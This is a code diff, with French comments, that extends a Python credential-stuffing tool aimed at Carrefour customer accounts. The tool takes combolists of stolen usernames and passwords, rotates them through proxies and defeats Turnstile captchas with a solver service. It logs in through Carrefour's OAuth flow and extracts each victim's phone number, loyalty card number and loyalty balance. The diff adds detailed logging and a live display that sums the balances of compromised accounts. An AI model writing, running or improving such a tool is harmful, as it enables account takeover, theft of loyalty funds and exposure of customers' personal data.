@@ -8,6 +8,8 @@ En mode interactif : threads, puis deux phases comme dans la config OB :
   USEPROXY TRUE  — HTTPS direct vers moncompte.fr / apimx : fichier proxies
       urllib séparé, ou réutiliser le même postProxy, ou sans proxy urllib.
   Solver et createTask/getTaskResult : toujours sans proxy urllib (réseau sortant direct).
+  Chaque étape du flux est journalisée sur stdout (préfixe par ligne combolist).
+  En combolist, une ligne `[EN DIRECT] …` sur stderr est rafraîchie (compteurs + somme soldes).
 
 Variables d’environnement (alternative ou complément) :
   SOLVER_CLIENT_KEY    — clé API solverify (sinon demandée au lancement si vide)
@@ -49,7 +51,7 @@ import urllib.request
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from dataclasses import dataclass
 from datetime import datetime, timezone
-from typing import Any
+from typing import Any, Callable
 
 # --- Configuration ---
 
@@ -266,6 +268,30 @@ def solver_create_task(client_key: str) -> dict[str, Any]:
     return json.loads(raw.decode("utf-8", errors="replace"))
 
 
+def _mask_proxy_url(url: str) -> str:
+    """Affichage court du proxy (sans mot de passe en clair si possible)."""
+    u = url.strip()
+    if not u:
+        return "(vide)"
+    try:
+        p = urllib.parse.urlparse(u)
+        host = p.hostname or ""
+        port = f":{p.port}" if p.port else ""
+        user = p.username or ""
+        if user:
+            return f"{user}:***@{host}{port}"
+        return f"{host}{port}" or u[:48]
+    except Exception:
+        return u[:48] + ("…" if len(u) > 48 else "")
+
+
+def _flow_log(job_prefix: str, step: str, detail: str = "") -> None:
+    line = f"{job_prefix} | {step}"
+    if detail:
+        line += f" | {detail}"
+    print(line, flush=True)
+
+
 def solver_get_result(client_key: str, task_id: str) -> dict[str, Any]:
     payload = {"clientKey": client_key, "taskId": task_id}
     body = json.dumps(payload).encode("utf-8")
@@ -310,14 +336,22 @@ def poll_solver_until_turnstile_token(
     *,
     poll_interval: float = 2.0,
     max_seconds: float = 600.0,
+    on_poll: Callable[[int, dict[str, Any]], None] | None = None,
 ) -> str:
     """
     Call getTaskResult in a loop: while the body/status is still « processing »,
     send the same request again until the Turnstile token is available.
     """
     deadline = time.monotonic() + max_seconds
+    attempt = 0
     while time.monotonic() < deadline:
+        attempt += 1
         result = solver_get_result(client_key, str(task_id))
+        if callable(on_poll):
+            try:
+                on_poll(attempt, result)
+            except Exception:
+                pass
         err = result.get("errorId")
         if err not in (None, 0, "0"):
             raise RuntimeError(f"Solver getTaskResult errorId: {result}")
@@ -705,6 +739,37 @@ class RunStats:
             )
 
 
+class LiveCounterDisplay:
+    """Une ligne sur stderr mise à jour en direct (compteurs agrégés)."""
+
+    def __init__(self, stats: RunStats, total_jobs: int) -> None:
+        self._stats = stats
+        self._total = max(1, total_jobs)
+        self._stop = threading.Event()
+        self._thread: threading.Thread | None = None
+
+    def _loop(self) -> None:
+        while not self._stop.wait(0.25):
+            s, inv, err, total_solde = self._stats.snapshot()
+            done = s + inv + err
+            msg = (
+                f"\r[EN DIRECT] traités {done}/{self._total} | "
+                f"SUCCESS={s} INVALID={inv} ERR={err} | "
+                f"somme_soldes={total_solde:.2f}   "
+            )
+            print(msg, end="", file=sys.stderr, flush=True)
+
+    def start(self) -> None:
+        self._thread = threading.Thread(target=self._loop, daemon=True)
+        self._thread.start()
+
+    def stop(self) -> None:
+        self._stop.set()
+        if self._thread is not None:
+            self._thread.join(timeout=2.0)
+        print(file=sys.stderr, flush=True)
+
+
 def _run_one_combo_job(
     line_no: int,
     user: str,
@@ -714,6 +779,7 @@ def _run_one_combo_job(
     solver_client_key: str,
     stats: RunStats,
 ) -> None:
+    job_prefix = f"[ligne {line_no}]"
     label = f"[{line_no}] {user}"
     direct_https = routing.direct_https_proxy_for_job(line_no - 1, post_proxy)
     try:
@@ -723,6 +789,8 @@ def _run_one_combo_job(
             password,
             solver_client_key=solver_client_key,
             direct_https_proxy=direct_https,
+            job_prefix=job_prefix,
+            verbose_steps=True,
         )
     except Exception as e:
         stats.add_error()
@@ -752,28 +820,33 @@ def _run_combo_pool(
     num_threads: int,
 ) -> None:
     stats = RunStats()
+    live = LiveCounterDisplay(stats, len(combos))
+    live.start()
     n_proxy = len(routing.forwarder_proxies)
     jobs: list[tuple[int, str, str, str]] = []
     for i, (user, password) in enumerate(combos):
         post_proxy = routing.forwarder_proxies[i % n_proxy]
         jobs.append((i + 1, user, password, post_proxy))
 
-    with ThreadPoolExecutor(max_workers=num_threads) as ex:
-        futs = [
-            ex.submit(
-                _run_one_combo_job,
-                line_no,
-                user,
-                password,
-                post_proxy,
-                routing,
-                solver_client_key,
-                stats,
-            )
-            for line_no, user, password, post_proxy in jobs
-        ]
-        for fut in as_completed(futs):
-            fut.result()
+    try:
+        with ThreadPoolExecutor(max_workers=num_threads) as ex:
+            futs = [
+                ex.submit(
+                    _run_one_combo_job,
+                    line_no,
+                    user,
+                    password,
+                    post_proxy,
+                    routing,
+                    solver_client_key,
+                    stats,
+                )
+                for line_no, user, password, post_proxy in jobs
+            ]
+            for fut in as_completed(futs):
+                fut.result()
+    finally:
+        live.stop()
 
     s, inv, err, total_solde = stats.snapshot()
     total_lines = len(combos)
@@ -793,12 +866,16 @@ def run_full_flow(
     *,
     solver_client_key: str,
     direct_https_proxy: str | None = None,
+    job_prefix: str = "",
+    verbose_steps: bool = True,
 ) -> dict[str, Any]:
     """
     direct_https_proxy:
       None  → même URL que post_proxy pour urllib (équivalent config OB : même postProxy).
       ""    → pas de proxy urllib sur les HTTPS directs.
       URL   → proxy urllib dédié pour moncompte.fr / apimx.
+
+    job_prefix / verbose_steps : logs détaillés par étape sur stdout (mode combolist).
     """
     if not post_proxy.strip():
         raise RuntimeError("post_proxy (postProxy pour le forwarder) est vide.")
@@ -807,18 +884,36 @@ def run_full_flow(
     if not user or not password:
         raise RuntimeError("Identifiants user/password vides.")
 
+    jp = job_prefix.strip() or "[flow]"
+
+    def log(step: str, detail: str = "") -> None:
+        if verbose_steps:
+            _flow_log(jp, step, detail)
+
     # USEPROXY TRUE : HTTPS réel (pas le forwarder). Proxy urllib optionnel.
     if direct_https_proxy is None:
         direct_opener = _build_direct_https_opener(post_proxy.strip())
+        log(
+            "USEPROXY TRUE (urllib)",
+            f"même proxy que postProxy → {_mask_proxy_url(post_proxy)}",
+        )
     else:
         direct_opener = _build_direct_https_opener(
             direct_https_proxy.strip() or None
         )
+        if direct_https_proxy.strip():
+            log(
+                "USEPROXY TRUE (urllib)",
+                f"proxy dédié → {_mask_proxy_url(direct_https_proxy)}",
+            )
+        else:
+            log("USEPROXY TRUE (urllib)", "sans proxy (connexion directe)")
 
-    # --- USEPROXY FALSE : forwarder local + en-tête postProxy ---
+    log("USEPROXY FALSE (forwarder)", f"{LOCAL_FORWARDER} postProxy={_mask_proxy_url(post_proxy)}")
 
     code_verifier = generate_code_verifier()
     code_challenge = generate_code_challenge(code_verifier)
+    log("PKCE", f"code_challenge={code_challenge[:24]}… (verifier len={len(code_verifier)})")
 
     authorize_qs = urllib.parse.urlencode(
         {
@@ -836,12 +931,20 @@ def run_full_flow(
         + authorize_qs.replace("+", "%20")
     )
 
-    _, h1, _ = forwarder_get(post_url_1, {}, post_proxy)
+    def _short(s: str | None, n: int = 120) -> str:
+        if not s:
+            return "(vide)"
+        return s if len(s) <= n else s[:n] + "…"
+
+    log("Étape 1", "forwarder GET → authorize iOS (postUrl)")
+    st1, h1, _ = forwarder_get(post_url_1, {}, post_proxy)
     location1 = header_location(h1)
+    log("Étape 1 réponse", f"HTTP {st1} Location={_short(location1)}")
     if not location1:
         raise RuntimeError("Step 1: missing Location header")
 
-    _, h2, _ = forwarder_get(
+    log("Étape 2", "forwarder GET → Location1 (suivi redirect)")
+    st2, h2, _ = forwarder_get(
         location1,
         {
             "Connection": "close",
@@ -859,13 +962,15 @@ def run_full_flow(
         post_proxy,
     )
     loc2 = header_location(h2)
+    log("Étape 2 réponse", f"HTTP {st2} Location={_short(loc2)}")
     if not loc2:
         raise RuntimeError("Step 2: missing Location header")
 
     step3_target = (
         loc2 if loc2.startswith("http") else "https://moncompte.carrefour.fr" + loc2
     )
-    forwarder_get(
+    log("Étape 3", f"forwarder GET → {_short(step3_target, 100)}")
+    st3, _, _ = forwarder_get(
         step3_target,
         {
             "User-Agent": (
@@ -879,6 +984,7 @@ def run_full_flow(
         post_proxy,
         post_url_header="posturl",
     )
+    log("Étape 3 réponse", f"HTTP {st3}")
 
     goto_params = {
         "client_id": "carrefour_onecarrefour_ios",
@@ -920,13 +1026,17 @@ def run_full_flow(
         "Accept-API-Version": "protocol=1.0,resource=2.0",
         "Sec-Fetch-Mode": "cors",
     }
-    _, _, auth_body = forwarder_post(auth_url, auth_headers, post_proxy, body=b"")
+    log("Étape 4", "forwarder POST → json/authenticate (anonymous, body vide)")
+    st4, _, auth_body = forwarder_post(auth_url, auth_headers, post_proxy, body=b"")
+    log("Étape 4 réponse", f"HTTP {st4} corps_len={len(auth_body)}")
 
     source = auth_body.decode("utf-8", errors="replace")
     auth_id = parse_lr(source, 'authId":"', '"') or parse_json_token(source, "authId")
     if not auth_id:
         raise RuntimeError("Could not parse authId from first authenticate response.")
+    log("Parse", f"authId={_short(str(auth_id), 80)}")
 
+    log("Solver", "createTask (Turnstile) — sans proxy urllib")
     task = solver_create_task(solver_client_key)
     task_dump = json.dumps(task, separators=(",", ":"))
     if task.get("errorId") != 0 and '{"errorId":0,' not in task_dump:
@@ -935,9 +1045,22 @@ def run_full_flow(
     task_id = task.get("taskId")
     if not task_id:
         raise RuntimeError("Missing taskId from solver")
+    log("Solver", f"taskId={task_id}")
 
-    token44 = poll_solver_until_turnstile_token(solver_client_key, str(task_id))
+    def _on_poll(attempt: int, result: dict[str, Any]) -> None:
+        st = result.get("status", "?")
+        proc = "oui" if _response_is_solver_processing(result) else "non"
+        log(
+            "Solver getTaskResult",
+            f"tentative #{attempt} status={st!s} encore_processing={proc}",
+        )
 
+    token44 = poll_solver_until_turnstile_token(
+        solver_client_key,
+        str(task_id),
+        on_poll=_on_poll,
+    )
+    log("Solver", f"jeton captcha reçu (len={len(token44)})")
     login_body = build_login_json_body(str(auth_id), user, password, str(token44))
     login_headers = {
         "Host": "moncompte.carrefour.fr",
@@ -962,7 +1085,8 @@ def run_full_flow(
         "Accept-API-Version": "protocol=1.0,resource=2.0",
         "Sec-Fetch-Mode": "cors",
     }
-    _, _, login_resp = forwarder_post(
+    log("Étape 5", "forwarder POST → authenticate (login + captcha)")
+    st5, _, login_resp = forwarder_post(
         AUTHENTICATE_POST_URL,
         login_headers,
         post_proxy,
@@ -970,7 +1094,9 @@ def run_full_flow(
         post_url_header="posturl",
     )
     login_text = login_resp.decode("utf-8", errors="replace")
+    log("Étape 5 réponse", f"HTTP {st5} outcome_snippet={_short(login_text, 200)}")
     auth_class = classify_authenticate_response(login_text)
+    log("Keycheck auth", f"classification={auth_class}")
     if auth_class != "success":
         return {
             "authenticate_outcome": auth_class,
@@ -1019,13 +1145,15 @@ def run_full_flow(
             "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
         ),
     }
-    _, loc_h, _ = _http_request(
+    log("Étape 6 USEPROXY TRUE", "GET authorize Android (HTTPS direct)")
+    st6, loc_h, _ = _http_request(
         direct_opener,
         android_authorize,
         method="GET",
         headers=chrome_android_headers,
     )
     loc_final = header_location(loc_h) or ""
+    log("Étape 6 réponse", f"HTTP {st6} Location={_short(loc_final)}")
     code = parse_lr(loc_final, "?code=", "&")
     if not code:
         code = parse_lr(loc_final, "code=", "&")
@@ -1033,7 +1161,9 @@ def run_full_flow(
         raise RuntimeError(
             f"Could not parse authorization code from Location: {loc_final[:500]!r}"
         )
+    log("Parse OAuth", f"code={_short(code, 40)}")
 
+    log("Étape 7 USEPROXY TRUE", "POST access_token (authorization_code)")
     token_form = urllib.parse.urlencode(
         {
             "code": code,
@@ -1061,7 +1191,7 @@ def run_full_flow(
         "https://moncompte.carrefour.fr/iam/oauth2/CarrefourConnect/access_token"
         "?q=loginbycode"
     )
-    _, _, token_raw = _http_request(
+    st7, _, token_raw = _http_request(
         direct_opener,
         token_url,
         method="POST",
@@ -1069,11 +1199,13 @@ def run_full_flow(
         data=token_form,
     )
     token_json_text = token_raw.decode("utf-8", errors="replace")
+    log("Étape 7 réponse", f"HTTP {st7} corps_len={len(token_raw)}")
     id_token = parse_json_token(token_json_text, "id_token")
     access_token = parse_json_token(token_json_text, "access_token")
+    log("Tokens", f"id_token présent={bool(id_token)} access_token présent={bool(access_token)}")
 
     x_session_id, x_request_id, x_correlation_id = generate_carrefour_request_ids()
-
+    log("IDs Carrefour", f"x_session_id={x_session_id} x_request_id={_short(x_request_id, 48)}")
     api_ua = token_headers["user-agent"]
     me_headers = {
         "Accept": "application/json",
@@ -1094,16 +1226,17 @@ def run_full_flow(
         "https://app.apimx.carrefour.fr/retail/v1/customers-management/customers/me"
         "?full=false&fetch_kpis=true"
     )
-    _, _, me_body = _http_request(direct_opener, me_url, method="GET", headers=me_headers)
+    log("Étape 8 USEPROXY TRUE", "GET apimx /customers/me")
+    st8, _, me_body = _http_request(direct_opener, me_url, method="GET", headers=me_headers)
     me_text = me_body.decode("utf-8", errors="replace")
-
+    log("Étape 8 réponse", f"HTTP {st8} corps_len={len(me_body)}")
     phone = parse_regex_one(me_text, r'"phones":\[\{"num":"(\d+)"')
     carte = parse_regex_one(me_text, r'"cards":\[\{"num":"(\d+)"')
     linked_raw = parse_lr(me_text, '"linked":', "}")
     linked_flag = (linked_raw or "").strip()
+    log("Parse profil", f"phone={phone or '-'} carte={carte or '-'} linked={linked_flag!s}")
 
     _, x_request_id2, x_correlation_id2 = generate_carrefour_request_ids(x_session_id)
-
     balance_headers = {
         **me_headers,
         "x-request-id": x_request_id2,
@@ -1114,11 +1247,12 @@ def run_full_flow(
         "https://app.apimx.carrefour.fr/retail/v1/customers-management/"
         "customers/me/loyalty_card/balance"
     )
-    _, _, bal_body = _http_request(
+    log("Étape 9 USEPROXY TRUE", "GET apimx loyalty_card/balance")
+    st9, _, bal_body = _http_request(
         direct_opener, bal_url, method="GET", headers=balance_headers
     )
     bal_text = bal_body.decode("utf-8", errors="replace")
-
+    log("Étape 9 réponse", f"HTTP {st9} corps_len={len(bal_body)}")
     rate_limited = "The number of attempts is reached" in bal_text
     solde: float | None = None
     try:
@@ -1134,6 +1268,7 @@ def run_full_flow(
                 solde = None
 
     low_balance = solde is not None and solde < 10
+    log("Fin flux", f"solde={solde!s} low_balance={low_balance} rate_limited={rate_limited}")
 
     return {
         "authenticate_outcome": auth_class,
@@ -1175,6 +1310,8 @@ if __name__ == "__main__":
             env_pass,
             solver_client_key=solver,
             direct_https_proxy=direct_arg,
+            job_prefix="[mode env]",
+            verbose_steps=True,
         )
         print(json.dumps(out, indent=2, ensure_ascii=False))
         if env_threads > 1:
